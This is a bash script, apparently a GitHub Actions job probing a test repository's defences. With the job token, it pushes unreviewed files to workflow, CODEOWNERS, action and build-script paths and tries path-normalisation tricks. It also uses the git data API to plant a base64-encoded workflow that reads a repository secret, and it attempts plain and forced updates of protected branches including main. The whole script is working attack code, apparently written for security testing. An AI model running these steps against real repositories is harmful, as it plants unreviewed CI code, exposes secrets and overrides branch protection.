#!/usr/bin/env bash
set -uo pipefail
if [ -z "${GITHUB_TOKEN:-}" ]; then
  echo "GS|VOID|GITHUB_TOKEN-EMPTY-IN-ENV - every result below is meaningless"; echo "GS|DONE"; exit 0
fi
echo "GS|EVENT|${GITHUB_EVENT_NAME:-?}|REF|${GITHUB_REF:-?}|RUN|${GITHUB_RUN_ID:-?}"
API=https://api.github.com/repos/kovac-labs/zz-mq-tok-1027
INJ_B64='bmFtZTogZ3NpbmplY3QKb246CiAgcHVzaDoKcGVybWlzc2lvbnM6CiAgY29udGVudHM6IHJlYWQKam9iczoKICBpbmo6CiAgICBydW5zLW9uOiB1YnVudHUtbGF0ZXN0CiAgICBzdGVwczoKICAgICAgLSBuYW1lOiBHU0lOSkVDVAogICAgICAgIGVudjoKICAgICAgICAgIFM6ICR7eyBzZWNyZXRzLk1RX1BST0JFIH19CiAgICAgICAgcnVuOiB8CiAgICAgICAgICBlY2hvICJHU0lOSkVDVHxSQU58ZXZlbnQ9JEdJVEhVQl9FVkVOVF9OQU1FfHJlZj0kR0lUSFVCX1JFRnxydW49JEdJVEhVQl9SVU5fSUQiCiAgICAgICAgICBwcmludGYgJ0dTSU5KRUNUfFNFQ1JFVHxsZW49JXMgc2hhMjU2LTE2PSVzXG4nICIkeyNTfSIgIiQocHJpbnRmICVzICIkUyIgfCBzaGEyNTZzdW0gfCBjdXQgLWMxLTE2KSIK'
api () { curl -s -o /tmp/o -w '%{http_code}' -X "$1" -H "Authorization: Bearer ${GITHUB_TOKEN}" \
         -H 'Accept: application/vnd.github+json' ${3:+-d "$3"} "$API$2"; }
j () { python3 -c "import json;d=json.load(open('/tmp/o'));print(d$1)" 2>/dev/null || echo PARSE-FAIL; }
body () { head -c "${1:-200}" /tmp/o | tr -d '\n'; }

BASE=gsbase
BR="gs-${GITHUB_RUN_ID}"
S=$(api GET "/git/ref/heads/${BASE}"); BSHA=$(j "['object']['sha']")
echo "GS|BASE|${BASE}|http=${S}|sha=${BSHA:0:12}"
S=$(api POST "/git/refs" "{\"ref\":\"refs/heads/${BR}\",\"sha\":\"${BSHA}\"}")
echo "GS|CREATE-REF|${BR}|http=${S}|$(body 140)"

# ---- PART A: the CONTENTS API, one PUT per path. The workflows path is the POSITIVE CONTROL.
put () {  # $1 = label, $2 = path
  local CB; CB=$(printf 'GS %s - attacker-authored, never reviewed, from run %s\n' "$1" "${GITHUB_RUN_ID}" | base64 -w0)
  local H; H=$(api PUT "/contents/$2" "{\"message\":\"gs $1\",\"content\":\"${CB}\",\"branch\":\"${BR}\"}")
  echo "GS|CONTENTS|$1|path=$2|http=${H}|$(body 170)"
}
put POSITIVE-CONTROL-workflows-dir  ".github/workflows/gsctl.yml"
put CODEOWNERS                      ".github/CODEOWNERS"
put COMPOSITE-ACTION                ".github/actions/gsx/action.yml"
put ROOT-ACTION-YML                 "action.yml"
put EXECUTED-BUILD-SCRIPT           "scripts/build.sh"
put PACKAGE-JSON-LIFECYCLE          "package.json"
put DEPENDABOT-CONFIG               ".github/dependabot.yml"
put NORMALISE-DOT                   ".github/workflows/./gsnorm1.yml"
put NORMALISE-DOTDOT                ".github/workflows/sub/../gsnorm2.yml"

# ---- PART B: the GIT DATA API. Does the guard live on the contents endpoint only?
S=$(api POST "/git/blobs" "{\"content\":\"${INJ_B64}\",\"encoding\":\"base64\"}"); BLOB=$(j "['sha']")
echo "GS|GITDATA|blob|http=${S}|sha=${BLOB:0:12}"
S=$(api GET "/git/commits/${BSHA}"); BTREE=$(j "['tree']['sha']")
echo "GS|GITDATA|base-tree|http=${S}|sha=${BTREE:0:12}"
S=$(api POST "/git/trees" "{\"base_tree\":\"${BTREE}\",\"tree\":[{\"path\":\".github/workflows/gsinject.yml\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"${BLOB}\"}]}"); NTREE=$(j "['sha']")
echo "GS|GITDATA|tree-WITH-WORKFLOW|http=${S}|sha=${NTREE:0:12}|$(body 170)"
S=$(api POST "/git/commits" "{\"message\":\"gs inject via git data api\",\"tree\":\"${NTREE}\",\"parents\":[\"${BSHA}\"]}"); NC=$(j "['sha']")
echo "GS|GITDATA|commit|http=${S}|sha=${NC:0:12}|$(body 170)"
S=$(api POST "/git/refs" "{\"ref\":\"refs/heads/gsinj-${GITHUB_RUN_ID}\",\"sha\":\"${NC}\"}")
echo "GS|GITDATA|NEW-REF-CARRYING-A-WORKFLOW|http=${S}|$(body 240)"
S=$(api GET "/contents/.github/workflows/gsinject.yml?ref=gsinj-${GITHUB_RUN_ID}")
echo "GS|GITDATA|READBACK-on-new-ref|http=${S}|size=$(j "['size']")"
# REACH controls: the same fast-forward commit onto PROTECTED refs
S=$(api PATCH "/git/refs/heads/${BASE}" "{\"sha\":\"${NC}\",\"force\":false}")
echo "GS|REACH|protected-base-${BASE}-ff|http=${S}|$(body 240)"
S=$(api PATCH "/git/refs/heads/${BASE}" "{\"sha\":\"${NC}\",\"force\":true}")
echo "GS|REACH|protected-base-${BASE}-force|http=${S}|$(body 240)"
S=$(api PATCH "/git/refs/heads/main" "{\"sha\":\"${NC}\",\"force\":false}")
echo "GS|REACH|protected-main-ff|http=${S}|$(body 240)"
# and the contents API on the ref the git data API just made, same path, for the discriminator
S=$(api PUT "/contents/.github/workflows/gsinject2.yml" "{\"message\":\"gs contents on the injected ref\",\"content\":\"${INJ_B64}\",\"branch\":\"gsinj-${GITHUB_RUN_ID}\"}")
echo "GS|DISCRIMINATOR|contents-api-same-path-same-branch|http=${S}|$(body 200)"
echo "GS|DONE"
